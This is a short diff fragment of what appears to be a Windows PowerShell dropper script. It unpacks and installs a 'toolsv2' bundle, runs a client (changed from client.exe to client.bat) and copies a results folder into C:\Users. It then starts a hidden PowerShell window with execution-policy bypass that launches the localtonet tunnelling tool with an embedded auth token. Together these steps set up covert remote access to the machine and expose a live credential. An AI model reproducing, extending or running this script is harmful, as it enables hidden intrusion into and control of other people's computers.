@@ -12,7 +12,7 @@ Unzip "Documents\toolsv2.zip" "Documents"
 add-appxpackage -path "Documents\toolsv2\python310.appx"
 cd Documents
 cd toolsv2
-./client.exe
+./client.bat
 robocopy 'results' 'C:\\Users\'
 start powershell {-exec bypass -WindowStyle Hidden IEX(./localtonet.exe authtoken gzPhq7vUOD3VfGLkYt29iEdj01yXcNmZI)} 
 cd 'C:\'
